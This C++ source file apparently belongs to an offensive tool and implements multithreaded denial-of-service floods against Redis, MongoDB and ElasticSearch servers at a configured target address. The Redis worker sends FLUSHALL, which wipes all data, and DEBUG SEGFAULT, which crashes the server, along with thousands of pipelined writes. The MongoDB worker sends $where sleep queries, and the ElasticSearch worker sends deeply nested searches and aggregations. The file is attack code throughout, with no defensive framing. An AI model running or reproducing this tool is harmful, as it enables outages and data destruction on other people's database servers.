#include "l7_database.h"
#include <sstream>
#include <random>
#include <chrono>
#include <cstring>
#include <iomanip>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #define close closesocket
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <unistd.h>
#endif

namespace laitoxx {

// Utility
static std::string random_string(size_t length) {
    static const char alphanum[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    static std::random_device rd;
    static std::mt19937 gen(rd());
    static std::uniform_int_distribution<> dis(0, sizeof(alphanum) - 2);

    std::string result;
    result.reserve(length);
    for (size_t i = 0; i < length; ++i) {
        result += alphanum[dis(gen)];
    }
    return result;
}

// ============================================================================
// Redis Flood
// ============================================================================

void RedisFlood::start() {
    log("Starting Redis RESP protocol flood");

    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&RedisFlood::attack_worker, this);
    }
}

std::string RedisFlood::build_redis_command(const std::string& cmd) {
    // RESP protocol format: *<num_args>\r\n$<len>\r\n<data>\r\n...
    std::stringstream ss;

    std::vector<std::string> parts;
    std::istringstream iss(cmd);
    std::string part;
    while (iss >> part) {
        parts.push_back(part);
    }

    ss << "*" << parts.size() << "\r\n";
    for (const auto& p : parts) {
        ss << "$" << p.length() << "\r\n" << p << "\r\n";
    }

    return ss.str();
}

std::vector<std::string> RedisFlood::generate_complex_commands() {
    return {
        build_redis_command("KEYS *"),
        build_redis_command("FLUSHALL"),
        build_redis_command("SAVE"),
        build_redis_command("BGSAVE"),
        build_redis_command("DEBUG SEGFAULT"),
        build_redis_command("CLIENT LIST"),
        build_redis_command("SLOWLOG GET 1000"),
        build_redis_command("CONFIG GET *"),
        build_redis_command("SCAN 0 COUNT 10000"),
        build_redis_command("MGET " + random_string(1000))
    };
}

void RedisFlood::attack_worker() {
    auto start_time = std::chrono::steady_clock::now();
    auto duration = std::chrono::seconds(config_.duration_seconds);

    while (!stop_flag_ &&
           std::chrono::steady_clock::now() - start_time < duration) {

        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(config_.port ? config_.port : 6379);
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            // Send AUTH if needed (optional)
            std::string auth = build_redis_command("PING");
            send(sock, auth.c_str(), auth.length(), 0);

            // Send complex commands
            auto commands = generate_complex_commands();
            for (const auto& cmd : commands) {
                if (stop_flag_) break;
                send(sock, cmd.c_str(), cmd.length(), 0);
                packets_sent_++;
            }

            // Pipeline many SET commands
            for (int i = 0; i < 1000 && !stop_flag_; ++i) {
                std::string key = random_string(50);
                std::string value = random_string(1000);
                std::string set_cmd = build_redis_command("SET " + key + " " + value);
                send(sock, set_cmd.c_str(), set_cmd.length(), 0);
                packets_sent_++;
            }
        }

        close(sock);
    }
}

// ============================================================================
// MongoDB Flood
// ============================================================================

void MongoDBFlood::start() {
    log("Starting MongoDB wire protocol flood");

    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&MongoDBFlood::attack_worker, this);
    }
}

std::vector<char> MongoDBFlood::encode_bson(const std::string& json) {
    // Simplified BSON encoding (real implementation would parse JSON)
    std::vector<char> bson;

    // Document length (placeholder)
    bson.insert(bson.end(), 4, 0);

    // Add string field: {query: "..."}
    bson.push_back(0x02); // String type
    bson.insert(bson.end(), json.begin(), json.end());
    bson.push_back(0x00);

    // End of document
    bson.push_back(0x00);

    // Update length
    uint32_t len = bson.size();
    bson[0] = len & 0xFF;
    bson[1] = (len >> 8) & 0xFF;
    bson[2] = (len >> 16) & 0xFF;
    bson[3] = (len >> 24) & 0xFF;

    return bson;
}

std::vector<char> MongoDBFlood::build_mongodb_query() {
    std::vector<char> packet;

    // MongoDB wire protocol header (16 bytes)
    // Message length (placeholder)
    packet.insert(packet.end(), 4, 0);

    // Request ID
    uint32_t req_id = rand();
    packet.push_back(req_id & 0xFF);
    packet.push_back((req_id >> 8) & 0xFF);
    packet.push_back((req_id >> 16) & 0xFF);
    packet.push_back((req_id >> 24) & 0xFF);

    // Response to (0)
    packet.insert(packet.end(), 4, 0);

    // OpCode: OP_QUERY (2004)
    packet.push_back(0xD4);
    packet.push_back(0x07);
    packet.push_back(0x00);
    packet.push_back(0x00);

    // Flags
    packet.insert(packet.end(), 4, 0);

    // Collection name: "test.collection\0"
    const char* coll = "test.collection";
    packet.insert(packet.end(), coll, coll + strlen(coll) + 1);

    // Number to skip
    packet.insert(packet.end(), 4, 0);

    // Number to return
    packet.push_back(0xFF);
    packet.push_back(0xFF);
    packet.push_back(0xFF);
    packet.push_back(0x7F);

    // Query document (BSON)
    std::string query = "{\"$where\": \"sleep(5000)\"}";
    auto bson = encode_bson(query);
    packet.insert(packet.end(), bson.begin(), bson.end());

    // Update length
    uint32_t len = packet.size();
    packet[0] = len & 0xFF;
    packet[1] = (len >> 8) & 0xFF;
    packet[2] = (len >> 16) & 0xFF;
    packet[3] = (len >> 24) & 0xFF;

    return packet;
}

std::vector<char> MongoDBFlood::build_mongodb_aggregate() {
    // Similar to query but with complex aggregation pipeline
    auto packet = build_mongodb_query();
    // Extend with aggregation stages (simplified)
    return packet;
}

void MongoDBFlood::attack_worker() {
    auto start_time = std::chrono::steady_clock::now();
    auto duration = std::chrono::seconds(config_.duration_seconds);

    while (!stop_flag_ &&
           std::chrono::steady_clock::now() - start_time < duration) {

        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(config_.port ? config_.port : 27017);
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            // Send complex queries
            for (int i = 0; i < 100 && !stop_flag_; ++i) {
                auto query = build_mongodb_query();
                send(sock, query.data(), query.size(), 0);
                packets_sent_++;
            }
        }

        close(sock);
    }
}

// ============================================================================
// ElasticSearch Flood
// ============================================================================

void ElasticSearchFlood::start() {
    log("Starting ElasticSearch REST API flood");

    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&ElasticSearchFlood::attack_worker, this);
    }
}

std::string ElasticSearchFlood::generate_search_request(int depth) {
    std::stringstream ss;
    ss << "{\n"
       << "  \"query\": {\n"
       << "    \"bool\": {\n"
       << "      \"must\": [\n";

    for (int i = 0; i < depth; ++i) {
        ss << "        {\n"
           << "          \"nested\": {\n"
           << "            \"path\": \"field" << i << "\",\n"
           << "            \"query\": {\n"
           << "              \"match_all\": {}\n"
           << "            }\n"
           << "          }\n"
           << "        }";
        if (i < depth - 1) ss << ",";
        ss << "\n";
    }

    ss << "      ]\n"
       << "    }\n"
       << "  },\n"
       << "  \"size\": 10000\n"
       << "}\n";

    return ss.str();
}

std::string ElasticSearchFlood::generate_aggregation_query() {
    std::stringstream ss;
    ss << "{\n"
       << "  \"size\": 0,\n"
       << "  \"aggs\": {\n"
       << "    \"agg1\": {\n"
       << "      \"terms\": {\n"
       << "        \"field\": \"field1\",\n"
       << "        \"size\": 10000\n"
       << "      },\n"
       << "      \"aggs\": {\n"
       << "        \"agg2\": {\n"
       << "          \"terms\": {\n"
       << "            \"field\": \"field2\",\n"
       << "            \"size\": 10000\n"
       << "          },\n"
       << "          \"aggs\": {\n"
       << "            \"agg3\": {\n"
       << "              \"terms\": {\n"
       << "                \"field\": \"field3\",\n"
       << "                \"size\": 10000\n"
       << "              }\n"
       << "            }\n"
       << "          }\n"
       << "        }\n"
       << "      }\n"
       << "    }\n"
       << "  }\n"
       << "}\n";

    return ss.str();
}

std::string ElasticSearchFlood::generate_complex_query() {
    return generate_search_request(10);
}

void ElasticSearchFlood::attack_worker() {
    auto start_time = std::chrono::steady_clock::now();
    auto duration = std::chrono::seconds(config_.duration_seconds);

    while (!stop_flag_ &&
           std::chrono::steady_clock::now() - start_time < duration) {

        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(config_.port ? config_.port : 9200);
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            std::string body = generate_complex_query();

            std::stringstream request;
            request << "POST /_search HTTP/1.1\r\n"
                   << "Host: " << config_.target_ip << "\r\n"
                   << "Content-Type: application/json\r\n"
                   << "Content-Length: " << body.length() << "\r\n"
                   << "\r\n"
                   << body;

            std::string req = request.str();
            send(sock, req.c_str(), req.length(), 0);
            packets_sent_++;

            // Also send aggregation query
            std::string agg_body = generate_aggregation_query();
            std::stringstream agg_request;
            agg_request << "POST /_search HTTP/1.1\r\n"
                       << "Host: " << config_.target_ip << "\r\n"
                       << "Content-Type: application/json\r\n"
                       << "Content-Length: " << agg_body.length() << "\r\n"
                       << "\r\n"
                       << agg_body;

            std::string agg_req = agg_request.str();
            send(sock, agg_req.c_str(), agg_req.length(), 0);
            packets_sent_++;
        }

        close(sock);
    }
}

} // namespace laitoxx
